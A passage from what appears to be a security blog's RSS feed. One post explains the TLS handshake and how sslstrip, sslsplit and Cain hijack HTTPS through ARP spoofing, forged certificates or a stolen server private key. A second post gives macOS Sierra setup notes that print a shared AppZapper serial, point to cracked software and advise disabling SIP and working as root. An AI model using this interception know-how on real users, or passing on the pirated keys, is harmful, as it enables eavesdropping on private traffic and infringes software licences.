https协议:建立在ssl协议之上的http协议[http over ssl](http协议建立在tcp协议之上)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-ssltls协议握手过程&quot;&gt;0x02 ssl/tls协议握手过程&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1)公钥私钥证书

一般来讲:
证书文件后缀:.crt,.pem
私钥文件后缀:.key
(这篇文章里说的&quot;嘗試對 SSL Private Key 下手&quot;应该是错的,那应该是SSL Public Key,
http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/)
证书请求文件:.csr
公钥加密的数据只有私钥能解开,同样,私钥加密的数据用公钥可以解开

公钥存放在证书文件中,证书相当于锁开着的箱子,私钥相当于箱子的锁的钥匙,ssl通信中的一方A利用证书中的公钥和某种协商
好的加密算法将要发送到另一方B的数据加密,这个动作相当于把东西放进箱子并将锁关闭,B收到被锁的箱子后用私钥打开锁就看
到明文了,实现了加密通信.

更详细情况可见:
http://www.fzb.me/2015-1-15-openssl-rsa.html
https://www.zhihu.com/question/29620953

2)ssl/tls协议握手过程
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/dot/ssl/sslfinal.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x03-几种https会话劫持工具&quot;&gt;0x03 几种https会话劫持工具&lt;/h3&gt;

&lt;h4 id=&quot;0xa-sslstrip&quot;&gt;0xa sslstrip&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;详情:https://software.intel.com/zh-cn/blogs/2011/10/11/ssl

用户输入www.baidu.com,通过arp欺骗使得browser不会访问到真正的http://www.baidu.com,而http://www.baidu.com的内容是
跳转到https://www.baidu.com,也即通过arp欺骗将browser的会话由https劫持成http,并由中间人与www.baidu.com服务器正常
https通信

缺点:使用有局限,要求用户输入url的时候没有输入https[一般用户不输入http或https,而是直接输入www.baidu.com]
优点:受害用户在访问www.baidu.com的时候browser不会提示证书不可信
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0xb-sslsplit&quot;&gt;0xb sslsplit&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sslsplit与cain几乎相同,只是sslsplit的证书是攻击者通过如下命令手动创建的
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt

而cain的证书是中间人向真实服务器主动获取并修改的
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0xc-cain&quot;&gt;0xc cain&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;中间人与browser和www.baidu.com服务器都进行正常ssl握手,中间人通过arp欺骗将自己伪装成www.baidu.com服务器,劫持受害
机器的browser的https://www.baidu.com/login.php的请求,中间人向www.baidu.com服务器请求证书,获取证书后将证书中的公
钥修改成中间人自己设置的公钥(中间人一般无法得到www.baidu.com服务器的私钥,私钥保存在www.baidu.com服务器上),并将
修改后的证书发给browser,browser看到证书可疑,提示用户证书可疑,用户不懂,选择将目标https://www.baidu.com添加到可信
任列表,之后browser正常请求https://www.baidu.com/login.php,与中间人进行ssl握手,此时的browser发给中间人的加密的数
据是用中间人修改过的公钥加密的,中间人有这个公钥的私钥[因为这个这个公钥私钥对是中间人伪造生成的],于是中间人用私
钥解密browser发过来的数据,再与www.baidu.com服务器走正常的ssl流程,也即将这解密后的数据重新加密发给www.baidu.com
服务器.而中间人在得到www.baidu.com返回的数据后将它解密后再加密发给browser,browser再正常地用与中间人ssl握手要用
的密钥来解密这个加密后的数据.

也即整个过程中,www.baidu.com服务器并不知道有中间人的存在,一直把中间人当作正常的browser,而中间人能和
www.baidu.com服务器进行正常的ssl握手(https通信)是因为中间人从browser那里得到解密后的数据,知道自己要访问什么内容
,于是正常走https协议访问.而browser与中间人的通信也一直是正常的ssl握手,只是对browser来讲,对方&quot;服务器&quot;(中间人)的
证书有问题,因为对方的公钥好像被修改过,无法被受害机器的browser验证为可信证书.

缺点:欺骗过程中browser会提示受害用户证书不可信
优点:一般用户会选择将要访问的网站加入到可信任列表,使得https劫持成功
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x04-私钥文件的用途&quot;&gt;0x04 私钥文件的用途&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;私钥的用途1:
如果中间人通过web等手段进入了www.baidu.com服务器,取出www.baidu.com的私钥,然后再进行https劫持,这样brower在访问
www.baidu.com的时候就不会发现证书有问题了,这样中间人也不用伪造证书,直接用www.baidu.com的证书,将证书发给
browser,再与browser进行正常ssl握手即可,所有加密的数据都可以由中间人解密,因为中间人有www.baidu.com的公钥和私钥.
其中,公钥在证书中,公钥用来加密发出的数据,私钥在中间人机器上,私钥用来解密browser发过来的数据.

私钥的用途2:结合wireshark利用得到的私钥解密ssl/tls流量
https://support.citrix.com/article/CTX135121
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 16 Mar 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/03/16/https%E5%8A%AB%E6%8C%81%E7%90%86%E8%A7%A3/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/03/16/https%E5%8A%AB%E6%8C%81%E7%90%86%E8%A7%A3/</guid>
        
        <category>https</category>
        
        <category>ssl</category>
        
        <category>mitm</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>安装macOS sierra要做的事</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;实际操作系统:
    macOS sierra 10.12.3

关于本文:
    记录新安装macOS sierra配置合适工作环境所遇到的坑与解决办法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.apple store下载安装xcode

2.安装howebrew,https://brew.sh/,如果无法安装,尝试连VPN后再安装,更多homebrew安装失败的问题可参考
https://www.zhihu.com/question/35928898

3.设置root用户可登录,https://support.apple.com/zh-cn/HT204012,以后用root登录(但是brew安装工具不让用root安装),需要
用brew安装工具时su - 普通用户 再安装

4.用root用户登录进行操作后发现root用户登录下mac app store无法打开(siri和ibooks也无法打开,这应该是macos的bug),如果
要安装常用的mac app store下的软件,可注销root用户,用普通用户登录后使用mac app store安装相关软件(eg.wechat)

5.mac apple store下载star vpn

6.安装百度五笔输入法

7.下载keyboard maestro,设置打开terminal.app快捷键为command+r,要注意的是安装了keyboard maestro之后不要安装 
Karabiner-Elements,否则Karabiner-Elements会影响系统按键导致系统键盘修饰设置无效与keyboard maestro设置失效.
在Automator中新建一个服务,在文件夹上可以右键打开终端,关于终端的两个选项都可勾选上
keyboard maestro序列号http://www.orsoon.com/Mac/78329.html

8.tmux+zsh+MacVim
1)安装zsh
注意,安装zsh不能用brew安装,因为brew安装工具现在不支持用root用户来安装,如果要用brew来安装zsh,这样安装好的zsh一般位
于/usr/local/bin/zsh,这样的zsh的tab在root用户登录系统后无法补全,因为zsh是非root用户安装的,
用非root用户登录时tab才有补全的功能,但是习惯用root用户登录,这样tab没有补全功能,于是不用brew安装zsh,用系统自带的
/bin/zsh就好了
chsh -s /bin/zsh
https://github.com/robbyrussell/oh-my-zsh安装oh-my-zsh
https://github.com/3xp10it/.zshrc安装我的配置

2)安装tmux
https://github.com/tmux/tmux/releases下载最新release版本后安装,安装方法一般为:
./configure
make
make install
rm -r ~/tmux
https://github.com/3xp10it/.tmux安装我的配置

3)安装MacVim
安装MacVim是因为在macOS上安装vim有无法使用系统剪切板的问题
a)https://github.com/macvim-dev/macvim/releases/下载最新release版
b)在~/.zshrc中加入:
alias mvim='/Applications/MacVim.app/Contents/MacOS/Vim'
alias vim='mvim'
c)解决MacVim无法使用系统剪切板的问题
http://stackoverflow.com/questions/39645253/clipboard-failure-in-tmux-vim-after-upgrading-to-macos-sierra
Attention:
vim8下不用加set clipboard=unnamed
在.tmux.conf更新后要执行tmux kill-server,否则就算重启也没用
也即,要解决这个问题要做下面三步:
第一步:brew install reattach-to-user-namespace
第二步:在.tmux.conf中加入:
set -g default-shell $SHELL 
set -g default-command &quot;reattach-to-user-namespace -l ${SHELL}&quot;
第三步:tmux kill-server
d)https://github.com/3xp10it/.vimrc安装我的配置
e)让配置生效
git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim
:PlugInstall(!)[other cmds are like:PluginUpdate,PlugeinClean,PluginList]
f)安装YouCompleteMe
g)macOS caps键处理,将caps映射为按一下为esc,按住为ctrl,具体如下:
http://longhua.io/how-to-map-caps-lock-to-both-control-and-escape-in-macos-sierra.html
[https://imciel.com/2016/09/09/macos-sierra-capslock-escape/这个方法好像更好]

9.brew install wget

10.安装firefox,在firefox中:
1)恢复书签https://github.com/3xp10it/firefoxBookmarks
2)安装vimperator,并安装我的配置文件
  要将https://raw.githubusercontent.com/macvim-dev/macvim/master/src/MacVim/mvim文件存放到本地/usr/shrae/mvim,
  chmod +x /usr/share/mvim[如果不能放则要关闭macOS sierra的SIP]
  这样.vimperatorrc中的设置vimperator的编辑器为/usr/share/mvim才有效(这里的mvim与~/.zshrc中的mvim效果不同
  ,~/.zshrc中的mvim是为了在终端下用macvim,这里的/usr/share/mvim是为了在vimperator中ctrl+i时用MacVim作为Editor以
  gui形式出现)
  macvim因为macOS的原因,要在macvim的偏好设置中设置关闭最后一个macvim窗口时关闭macvim这个app,这样才能让
  vimperator在macvim编辑完firefox中的文本后回到firefox
3)安装插件:
s3 google translator
hackbar
...

11.让finder标题显示当前路径
defaults write com.apple.finder _FXShowPosixPathInTitle -bool YES 
killall Finder

12.其他文件的恢复,git密码配置文件,pypi配置文件,jekyll博客环境等

13.macOS分屏
https://sspai.com/post/36983
下载magnet破解版,设置快捷键如下:
ctrl+command+i:上半屏
ctrl+command+k:下半屏
ctrl+command+h:左半屏
ctrl+command+l:右半屏
shift+command+u:左上屏
shift+command+i:右上屏
shift+command+j:左下屏
shift+command+k:右下屏
ctrl+command+enter:整屏

14.设置快捷键
keyboard maestro设置:
打开finder快捷键为command+e
打开快速搜索快捷键为ctrl+s
打开终端iterm2为command+r
跳转到桌面设置为command+d
设置command+shift+h为command+up,可在finder中跳转到上一级目录
设置command+shitf+l为command+down,可在finder中跳转到下一级目录(这里不设置成command+l为command+down是因为
command+l是firefox中的跳转到url定位栏快捷键)
设置command+j为down,设置command+k为up,因为down和up键不好按,小而远
设置magnet的快捷键:
ctrl+command+ikjl分别为上下左右,左上左下右上右下暂不设置,用得少
设置alfred的呼出键为double command
设置vimperator中ctrl+hljk为up,down,left,right,在是在url状态栏中无效(用ctrl+i编辑器编辑),其他输入框有效

15.关闭macOS的SIP
https://www.igeeksblog.com/how-to-disable-system-integrity-protection-on-mac/
也即在恢复模式下终端运行:csrutil disable,然后重启

16.git命令error: RPC failed; curl 56 SSLRead() return error错误的解决办法:
--------------来自网上的可靠解决方法-----------
http://stackoverflow.com/questions/30385939/git-clone-fails-with-sslread-error-on-os-x-yosemite
也即:
brew remove git
brew remove curl
brew install openssl
brew install --with-openssl curl
brew install --with-brewed-curl --with-brewed-openssl git

error: RPC failed; curl 56 SSL read: error:00000000:lib(0):func(0):reason(0), errno54错误解决方法:
http://www.jianshu.com/p/4edd496229d5
也即:
1)在新mac系统上配置新ssh key
2)git config --global http.postBuffer 524288000
----------------end-----------------
试了上面的方法,遇到障碍,要解决升级openssl的问题,由于macOS默认的openssl在/usr/bin/openssl下,macOS系统中其他工具依
赖的openssl的路径为系统默认的/usr/bin/openssl,而brew安装的新版本的openssl的路径为/usr/local/bin/openssl[实际路径
为/usr/local/Cellar/openssl/1.0.2k/bin/openssl],于是执行以下操作:
-----------------my final solution:---------------
brew remove git
brew remove curl
brew install openssl[如果失败则--force]
mv /usr/bin/openssl /usr/bin/openssl_old[备份原来的openssl]
ln -s /usr/local/Cellar/openssl/1.0.2k/bin/openssl[这个实际路径有可能会随着时间变化] /usr/bin/openssl
brew install --with-openssl curl
brew install --with-brewed-curl --with-brewed-openssl git
到这里应该会发现git clone没有出现RPC failed,curl...的错误了,如果还有错误,则继续完成这里的操作http://www.jianshu.com/p/4edd496229d5
--------------------end-----------------------

17.安装Alfred,Go2Shell,1Password,cd to,appzapper
其中appzapper序列号如下:
Name: apple-go
Serial: APZP-103-97-215-111

18.设置一个备份计划任务,macOS用launchctl实现:
    cd /Library/LaunchDaemons
    vi macosbak.plist:
    ----------macosbak.plist---------
    &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
    &amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
    &amp;lt;plist version=&quot;1.0&quot;&amp;gt;
    &amp;lt;dict&amp;gt;
      &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;
      &amp;lt;string&amp;gt;macosbak.plist&amp;lt;/string&amp;gt;
      &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
      &amp;lt;array&amp;gt;
          &amp;lt;string&amp;gt;/usr/share/mytools/macosbak.sh&amp;lt;/string&amp;gt;
      &amp;lt;/array&amp;gt;
      &amp;lt;key&amp;gt;StartCalendarInterval&amp;lt;/key&amp;gt;
      &amp;lt;dict&amp;gt;
            &amp;lt;key&amp;gt;Minute&amp;lt;/key&amp;gt;
            &amp;lt;integer&amp;gt;15&amp;lt;/integer&amp;gt;
            &amp;lt;key&amp;gt;Hour&amp;lt;/key&amp;gt;
            &amp;lt;integer&amp;gt;22&amp;lt;/integer&amp;gt;
      &amp;lt;/dict&amp;gt;
      &amp;lt;key&amp;gt;StandardOutPath&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;/private/var/root/Documents/AutoMakeLog.log&amp;lt;/string&amp;gt;
    &amp;lt;key&amp;gt;StandardErrorPath&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;/private/var/root//Documents/AutoMakeLog.err&amp;lt;/string&amp;gt;
    &amp;lt;/dict&amp;gt;
    &amp;lt;/plist&amp;gt;
    -------------end---------------
    launchctl load macosbak.plist

    表示每天22:15备份系统文件,有两个要注意的地方:
    1.运行脚本的地方不能直接写命令,不能写/bin/bash/usr/share/mytools/macosbak.sh,
    要写文件路径(也即/usr/shrae/mytools/macosbak.sh)
    2.这个文件事先要:
    chmod +x /usr/share/mytools/macosbak.sh
    3.更多细节可参考:
    http://honglu.me/2014/09/20/OSX系统添加定时任务/

    macosbak.sh可见:
    https://raw.githubusercontent.com/3xp10it/mytools/master/macosbak.sh

19.设置iterm2为终端,在iterm2的偏好设置中设置添加按键映射:
    command+&amp;lt;-为:send esc + [1;5D   实现左移一个单词功能
    command+-&amp;gt;为:send esc + [1;5C   实现右移一个单词功能
    可参考:
    http://apple.stackexchange.com/questions/154292/iterm-going-one-word-backwards-and-forwards

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-快捷键&quot;&gt;0x02 快捷键&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;上面的配置得到可用的快捷键汇总如下：

终端下:
command+&amp;lt;-:左移一个单词
command+-&amp;gt;:右移一个单词
caps+a:移到行首
caps+e:移到行尾
caps+d:del光标后的一个字符 

find中:

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sat, 11 Mar 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/linux/2017/03/11/%E5%AE%89%E8%A3%85macOS-sierra%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B/</link>
        <guid isPermaLink="true">http://localhost:4000/linux/2017/03/11/%E5%AE%89%E8%A3%85macOS-sierra%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B/</guid>
        
        <category>macOS</category>
        
        <category>sierra</category>
        
        
        <category>linux</category>
        
      </item>
    
  </channel>
</rss>
